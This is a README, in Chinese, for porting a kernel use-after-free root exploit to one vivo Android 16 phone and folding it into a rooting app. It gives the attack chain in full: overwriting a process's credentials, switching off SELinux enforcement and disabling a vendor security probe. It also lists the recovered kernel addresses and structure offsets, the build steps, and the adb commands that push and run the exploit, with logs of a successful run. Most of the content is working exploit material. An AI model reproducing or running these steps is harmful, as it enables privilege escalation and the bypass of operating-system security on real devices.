# V2505A CVE-2026-98260 临时提权移植

## 状态

该移植曾在目标设备完成临时提权验证：

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
kernelsu              221184  1
SELinux=Enforcing
```

全程未修改或刷写 `vendor_boot`，重启后临时 root 和本次内核改动都会消失。
仓库只保留源码、构建脚本和 App 必需的运行资产，不提交验证日志、APK、
OTA 提取物或本地依赖缓存。

## App 集成

V2505A 已作为第三个独立入口合入 App，不复用 `t98260`、`t61269`：

- `ExploitKind.CVE2505A` 只在厂商为 `vivo` 且内核完整 release
  等于 `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
  时自动选择。
- 部署内容只有 `v2505a_run.sh` 和 `v2505a_plant`。
- `v2505a_run.sh` 使用自己的 `ALREADY_LOADED` 和失败重试语义；失败的
  plant 会转成 holder 保留现场，脚本跳过 holder，同一 boot 可直接重试。
- V2505A 入口隐藏不适用的反 root、卸载防护、SUSFS 和 VFS 开关。

App 构建验证：

```text
:app:assembleDebug
BUILD SUCCESSFUL
```

APK 属于本地构建产物，不纳入版本控制。构建需要仓库内的
`assets/pyb110/v2505a_plant` 和 `assets/pyb110/v2505a_run.sh`；
当前 V2505A 设备启动 App 后，信息卡会自动显示
`CVE-2026-98260-vivo-V2505A`。

## 目标设备

- 型号：`vivo V2505A / PD2505`
- Android：16 / SDK 36
- 构建：`PD2505B_A_16.0.24.7.W10`
- 内核：`6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
- Bootloader：`locked`，`verifiedbootstate=green`
- 当前 ADB：`10AG1S2Y6D005Z0`

## 链路

1. 通过 `CVE-2026-98260` 的 POSIX CPU timer UAF 获得零写和 fake-cred 写原语。
2. 将目标 task 的 `cred` 指向受控 fake cred。
3. 关闭 SELinux enforcing。
4. 将 fake cred 的 `uid` 清零。
5. 将 `__tracepoint_sys_exit->funcs` 清零，使 vivo `vr.ko` 的
   `sys_exit` 探针失联。
6. 唤醒 root 子进程，执行 KernelSU late-load。
7. 通过 `su -c id` 验证。

`vr.ko` 的处理采用社区 W1c 方法，参考来源与 BTF 校验见
`reference/README.md`。

## 已恢复常量

内核符号和 BTF 来自 OTA 的 `boot.img`。OTA、解包文件和恢复后的 ELF
都属于本地分析输入，不纳入版本控制。

```c
#define STATIC_TIMER_SITE         0xffffffc0801e0890ULL
#define TIMER_SITE_LOW21          0x1e0890ULL

#define SELINUX_STATE_STATIC      0xffffffc082679370ULL
#define PANIC_ON_WARN_STATIC      0xffffffc0823eafe0ULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc082594840ULL
#define TRACEPOINT_FUNCS_OFF      0x48ULL

#define ROOT_USER_STATIC          0xffffffc082411ae0ULL
#define INIT_USER_NS_STATIC       0xffffffc082411868ULL
#define INIT_UCOUNTS_STATIC       0xffffffc082413478ULL
#define INIT_GROUPS_STATIC        0xffffffc082412fa8ULL

#define COPY_PROCESS_LOW21        0xcfd98ULL

#define OFF_TASK_CRED             0x900ULL
#define CRED_UID_OFF              0x8ULL
#define CRED_REQ                  0xb8ULL
#define CRED_ALLOC                0xc0ULL
#define TASK_ALLOC_BYTES          0x1440ULL
#define TIMER_ALLOC               0x100ULL
#define FULLCAP                   0x1ffffffffffULL
```

BTF 校验：

- `sizeof(struct cred) = 0xb8`
- `task_struct.cred = 0x900`
- `task_security_struct.exec_sid/create_sid = 0x8/0xc`
- `sizeof(struct tracepoint) = 0x50`
- `tracepoint.funcs = 0x48`

## 编译

构建源码为仓库根目录的 `exploit/src/t61269_plant.c`。

```powershell
$env:ANDROID_NDK_HOME = "C:\path\to\android-ndk-r28c"
.\ports\v2505a\build-v2505a.ps1 -Mode Both
```

本地生成产物：

- `bin/v2505a_probe`：只读探测程序，编译时定义 `PROBE_ONLY`
- `bin/v2505a_plant`：完整链路，运行时参数为 `fake`

`bin/` 已被 `.gitignore` 忽略。需要更新 App 内置 payload 时：

```powershell
Copy-Item .\ports\v2505a\bin\v2505a_plant `
  .\app\app\src\main\assets\pyb110\v2505a_plant -Force
```

## 运行

推送并设置权限：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "mkdir -p /data/local/tmp/v2505a-port"
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_probe /data/local/tmp/v2505a-port/v2505a_probe
adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_plant /data/local/tmp/v2505a-port/v2505a_plant
adb -s 10AG1S2Y6D005Z0 shell "chmod 755 /data/local/tmp/v2505a-port/v2505a_probe /data/local/tmp/v2505a-port/v2505a_plant"
```

先执行只读 probe：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && ./v2505a_probe probe"
```

再执行完整链路。`libksud.so` 路径由当前安装的 KernelSU 包动态解析：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && KSUD=`"`$(pm path me.weishu.kernelsu | sed -n 's/^package://p' | sed 's#/base.apk$##')/lib/arm64/libksud.so`" && env PYB110_KSUD=`"`$KSUD`" PYB110_MANAGER_PKG='me.weishu.kernelsu' PYB110_KMI='android16-6.12' ./v2505a_plant fake"
```

成功后进程会保持 parked，日志出现：

```text
[+] stage vr_sys_exit target=...
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
PLANT_CRED_OK child=...
LATE_LOAD_RC=0
```

独立验收：

```powershell
adb -s 10AG1S2Y6D005Z0 shell "su -c id"
adb -s 10AG1S2Y6D005Z0 shell "su -c 'lsmod | grep -i kernelsu; getenforce'"
```

## 验证结论

- 干净 boot 上 probe 返回 `PROBE_OK`，成功得到 KASLR slide 和
  `vr_sys_exit` funcs 槽地址。
- 一次完整运行中四次 stage 写全部命中；`vr_sys_exit` 零写后子进程未被杀，
  KernelSU late-load 返回 0。
- 独立执行 `su -c id`、模块检查和 SELinux 检查，均符合预期。
- 受控失败流程不会写入 dirty 标记；plant 转成 holder 后可在同一 boot 重试。

## 注意事项

- UAF 写入具有概率性。任何 stage 失败后都可等 plant 转成 holder 后在同一 boot
  直接重试；不要主动 kill 或 reap holder。
- 不要刷分区或修改 `vendor_boot`。本方案只做运行时内核内存写。
- 每次重启后 KASLR、SELinux、`vr.ko` 状态都会恢复，必须重新运行完整链路。
- KernelSU 包路径包含随机目录，不要硬编码旧路径。

## 目录

```text
ports/v2505a/
├── README.md
├── build-v2505a.ps1
├── reference/README.md
└── tools/
    ├── btf_inspect.py
    ├── kernel_analyze.py
    ├── payload_info.py
    ├── unpack_bootimg.py
    └── zstd_unwrap.py
```

本地生成的 `bin/`、`artifacts/`、`logs/`、`app/`、`work/`、
`tools/vendor/` 和 Python 缓存都已忽略，不提交到仓库。
